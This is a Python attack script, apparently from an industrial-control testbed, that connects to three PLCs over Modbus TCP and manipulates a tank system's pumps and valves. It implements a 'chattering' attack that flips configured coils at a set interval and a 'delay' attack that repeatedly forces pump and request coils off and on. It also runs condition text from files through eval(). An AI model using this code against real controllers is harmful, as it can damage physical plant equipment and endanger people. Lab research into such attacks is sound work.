import configparser
import logging
import sys
import time

from pymodbus.client import ModbusTcpClient


class Plc:
    def __init__(self, name, host, port, coils):
        self.name = name
        self.host = host
        self.port = port
        self.coils = coils
        self.client = ModbusTcpClient(self.host, self.port)
        self.client.connect()

    def poll_data(self):
        if self.name == "plc1":
            coil0 = self.client.read_coils(0, 1).bits[0]
            coil1 = self.client.read_coils(1, 1).bits[0]
            coil2 = self.client.read_coils(2, 1).bits[0]

            # input0 = self.client.read_input_registers(0, 1).registers[0]
            input0 = self.client.read_holding_registers(1026, 1).registers[0]  # %MW2
            input1 = self.client.read_input_registers(1, 1).registers[0]

            holding0 = self.client.read_holding_registers(1024, 1).registers[0]
            holding1 = self.client.read_holding_registers(1025, 1).registers[0]

            return {"pumps_plc1": coil0, "valve_plc1": coil1, "richiesta_plc1": coil2, "level_plc1": input0,
                    "request_plc1": input1, "low_1_plc1": holding0, "high_1_plc1": holding1}

        elif self.name == "plc2":
            coil0 = self.client.read_coils(0, 1).bits[0]

            # input0 = self.client.read_input_registers(0, 1)
            input0 = self.client.read_holding_registers(1027, 1)

            holding1 = self.client.read_holding_registers(1025, 1).registers[0]
            holding2 = self.client.read_holding_registers(1026, 1).registers[0]

            return {"request_plc2": coil0, "level_plc2": input0, "low_2_plc2": holding1, "high_2_plc2": holding2}

        elif self.name == "plc3":
            coil0 = self.client.read_coils(0, 1).bits[0]
            coil1 = self.client.read_coils(1, 1).bits[0]

            # input0 = self.client.read_input_registers(0, 1)
            input0 = self.client.read_holding_registers(1024, 1).registers[0]

            return {"pump_plc3": coil0, "high_plc3": coil1, "level_plc3": input0}


def attack(ctx):
    config = configparser.ConfigParser(interpolation=None)
    config.read('config.ini')

    plc_to_attack = []
    for plc_name in ["plc1", "plc2", "plc3"]:
        address = config.get('plc', plc_name, fallback=None)

        if address == "":
            plc_to_attack.append(None)
            continue

        parts = address.split(':')
        if len(parts) == 1:
            host = parts[0]
            port = 502
        elif len(parts) == 2:
            host = parts[0]
            port = int(parts[1])
        else:
            logging.error(f'invalid address format {address} for plc {plc_name}.')
            sys.exit(1)

        coils_to_attack = []
        for option, value in config.items(f"{plc_name} coils to attack"):
            if value.lower() == 'true':
                coils_to_attack.append((option[:-1], int(option[-1])))

        plc_to_attack.append(Plc(plc_name, host, port, coils_to_attack))

    delay_targets = []
    for option, value in config.items("delay target"):
        if value.lower() == 'true':
            delay_targets.append(option)

    if config.get('conditions', "coils_conditions") == "True":
        try:
            with open('./coils_conditions.txt', 'rt') as file:
                coils_conditions = ' '.join(file.readlines())
                logging.info(coils_conditions)
        except Exception as e:
            logging.error(e)
            sys.exit(1)

    coils_conditions = ""
    if config.get('conditions', "coils_conditions") == "True":
        try:
            with open('./coils_conditions.txt', 'rt') as file:
                coils_conditions = ' '.join(file.readlines())
                logging.info(coils_conditions)
        except Exception as e:
            logging.error(e)
            sys.exit(1)

    input_registers_conditions = ""
    if config.get('conditions', "input_conditions") == "True":
        try:
            with open('./input_conditions.txt', 'rt') as file:
                input_registers_conditions = ' '.join(file.readlines())
                logging.info(input_registers_conditions)
        except Exception as e:
            logging.error(e)
            sys.exit(1)

    conditions_connection = str.lower(config.get('conditions', "connection", fallback=None))

    logging.info(f"Conditions on coils: {coils_conditions}.")
    logging.info(f"Conditions on input registers: {input_registers_conditions}.")
    try:
        delay = int(config.get('other options', "delay", fallback=None)[1:-1])
        logging.info("Launching basic chattering attack.")

        delay_tank(plc_to_attack, coils_conditions, input_registers_conditions, delay, delay_targets,
                   conditions_connection)
        sys.exit(0)
    except Exception as e:
        logging.error(e)
        delay = ""

    try:
        chattering_interval = int(config.get('other options', "chattering_interval", fallback=None))
        logging.info("Launching delay attack.\n")

        basic_chattering(plc_to_attack, coils_conditions, input_registers_conditions, chattering_interval,
                         conditions_connection)
        sys.exit(0)
    except Exception as e:
        logging.error("Neither delay nor interval have been set.\n")
        sys.exit(1)


def eval_conditions(merged_poll, conditions):
    try:
        result = eval(conditions, {"__builtins__": None}, merged_poll)
        logging.info(f"Verifying conditions: {conditions} ---> Result: {result}")

        return result
    except Exception as e:
        logging.error("Eval condition error: " + str(e))
        return False


def get_all_poll(plcs: [Plc]):
    polled_data = {}
    for plc in plcs:
        if plc is not None:
            poll = plc.poll_data()
            polled_data = {**polled_data, **poll}
            logging.info("Poll " + plc.name + ": " + str(poll))

    return polled_data


def get_delay_targets_status(polled_data, delay_targets, status):
    if len(status) <= 0:
        if "fill_plc1" in delay_targets:
            status["fill_plc1"] = polled_data["pumps_plc1"]
        if "empty_plc1" in delay_targets:
            status["empty_plc1"] = polled_data["valve_plc1"]
        if "empty_plc3" in delay_targets:
            status["empty_plc3"] = polled_data["pump_plc3"]
    else:
        if "fill_plc1" in delay_targets:
            status["fill_plc1"] = polled_data["pumps_plc1"] if not status["fill_plc1"] else status["fill_plc1"]
        if "empty_plc1" in delay_targets:
            status["empty_plc1"] = polled_data["valve_plc1"] if not status["empty_plc1"] else status["empty_plc1"]
        if "empty_plc3" in delay_targets:
            status["empty_plc3"] = polled_data["pump_plc3"] if not status["empty_plc3"] else status["empty_plc3"]

    return status


def basic_chattering(plcs: [Plc], start_condition, end_condition, chattering_interval, conditions_connection):
    try:
        logging.info("Polling data to check conditions...")
        polled_data = {}

        while True:
            polled_data = get_all_poll(plcs)

            if start_condition == "" and end_condition == "":
                break
            elif start_condition == "" or end_condition == "":
                if eval_conditions(polled_data, start_condition + end_condition):
                    break
            elif eval_conditions(polled_data, f"{start_condition} {conditions_connection} {end_condition}"):
                break

            time.sleep(chattering_interval)

        logging.info("Conditions verified... Starting attack.\n")

        logging.info("Start time at second 0.")
        while True:
            t_start_cycle = time.time()
            for plc in plcs:
                if plc is not None:
                    for i, (name, address) in enumerate(plc.coils):
                        plc.client.write_coil(address, False if polled_data[name] is True else True)

            tc = time.time()
            logging.info(f"New values sent in {tc - t_start_cycle} seconds.")

            logging.info("Polling modified data.")
            polled_data = get_all_poll(plcs)

            if end_condition != "":
                if not eval_conditions(polled_data, end_condition):
                    break

            tl = time.time()
            logging.info(f"Lasting other operations: {tl - tc}.")

            time.sleep(chattering_interval)
            logging.info(f"Slept for {time.time() - tl}.\n")

        logging.info("Chattering Attack completed successfully.")
    except Exception as e:
        logging.error("Error executing attack: " + str(e))


def delay_tank(plcs: [Plc], start_condition, end_condition, delay, delay_targets, conditions_connection):
    try:
        logging.info("Polling data to check conditions...")
        polled_data = {}

        while True:
            polled_data = get_all_poll(plcs)

            if start_condition + end_condition == "":
                break
            elif start_condition == "" or end_condition == "":
                if eval_conditions(polled_data, start_condition + end_condition):
                    break
            elif eval_conditions(polled_data, f"{start_condition} {conditions_connection} {end_condition}"):
                break

            time.sleep(1)

        seconds_closed = 4 * delay // 100
        seconds_opened = 4 if 4 - seconds_closed == 0 else 4 - seconds_closed
        logging.info("Conditions verified... Starting attack.")
        logging.info(f"Time opened: {seconds_opened}, Time closed: {seconds_closed}.\n")

        starting_status = get_delay_targets_status(polled_data, delay_targets, {})

        logging.info("Start time at second 0.")
        while True:
            t_start_cycle = time.time()

            for _ in range(int(seconds_closed * 1000 / 10)):  # closed for seconds_closed
                if "fill_plc1" in delay_targets and starting_status["fill_plc1"] is True and plcs[0] is not None:
                    plcs[0].client.write_coil(0, False)  # set pumps = False
                if "empty_plc1" in delay_targets and starting_status["empty_plc1"] is True and plcs[0] is not None:
                    plcs[0].client.write_coil(2, False)  # set Richiesta = False
                if "empty_plc3" in delay_targets and starting_status["empty_plc3"] is True and plcs[2] is not None:
                    plcs[2].client.write_coil(0, False)  # set pump = False
                    plcs[2].client.write_coil(1, False)  # set high = False

                time.sleep(10 / 1000)  # Sleep for 10 milliseconds

            tc = time.time()
            logging.info(f"Delayed for {tc - t_start_cycle} seconds.")

            for _ in range(int(seconds_opened * 1000 / 10)):  # opened for seconds_open
                if "fill_plc1" in delay_targets and starting_status["fill_plc1"] is True and plcs[0] is not None:
                    plcs[0].client.write_coil(0, True)  # set pumps = True

                if "empty_plc1" in delay_targets and starting_status["empty_plc1"] is True and plcs[0] is not None:
                    plcs[0].client.write_coil(2, True)  # set Richiesta = True

                # if "empty_plc3" in delay_targets and starting_status["empty_plc3"] is True and plcs[2] is not None:
                    # plcs[2].client.write_coil(0, True)  # set pump = True

                time.sleep(10 / 1000)  # Sleep for 10 milliseconds

            to = time.time()
            logging.info(f"Opened for {to - tc} seconds.")

            logging.info("Polling new data.")
            polled_data = get_all_poll(plcs)

            starting_status = get_delay_targets_status(polled_data, delay_targets, starting_status)

            if end_condition != "":
                if not eval_conditions(polled_data, end_condition):
                    break

            tf = time.time()
            logging.info(f"Lasting other operations: {tf - to}.")
            logging.info(f"Cycle lastet for {time.time() - t_start_cycle} seconds.\n")

        logging.info("Delay Attack completed successfully.")
    except Exception as e:
        logging.error("Error executing attack: " + str(e))
